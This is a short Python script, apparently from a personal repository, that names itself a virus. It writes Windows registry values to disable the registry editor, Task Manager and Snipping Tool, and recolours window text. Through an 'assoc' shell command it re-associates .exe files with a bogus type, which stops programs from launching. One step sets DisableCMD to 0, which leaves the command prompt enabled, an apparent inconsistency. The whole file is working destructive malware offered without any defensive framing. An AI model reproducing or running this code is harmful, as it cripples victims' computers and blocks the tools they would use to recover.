##  Author : azronaftara ##
##  Created at : 2023 ##

import winreg as reg
import subprocess

def create_virus(root_key, key_path, key_name, value_type ,value):
    key = reg.CreateKey(root_key, key_path)
    reg.SetValueEx(key, key_name, 0, value_type, value)
    reg.CloseKey(key)

# 1. Imron (disable registry editor)
virus1 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableRegistryTools',
    'value_type': reg.REG_DWORD,
    'value': 1
}
create_virus(**virus1)

# 2. Laras (disable task manager)
virus2 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableTaskMgr',
    'value_type': reg.REG_DWORD,
    'value': 1
}
create_virus(**virus2)

# 3. Alin 
key2 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Colors')
reg.SetValueEx(key2, 'WindowText', 0, reg.REG_SZ, "0 255 0")
reg.CloseKey(key2)

# 4. Fitri (disable snipping tools)
key3 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\TabletPC')
reg.SetValueEx(key3, 'DisableSnippingTool', 0, reg.REG_DWORD, 1)
reg.CloseKey(key3)

# 5. Asti
file_extension = ".exe"
file_type = ".hank"
command = f'assoc {file_extension}={file_type}'
subprocess.run(command, shell=True)

# 6. Hanum
key4 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Policies\\Microsoft\\Windows\\System')
reg.SetValueEx(key4, 'DisableCMD', 0, reg.REG_DWORD, 0)
reg.CloseKey(key4)
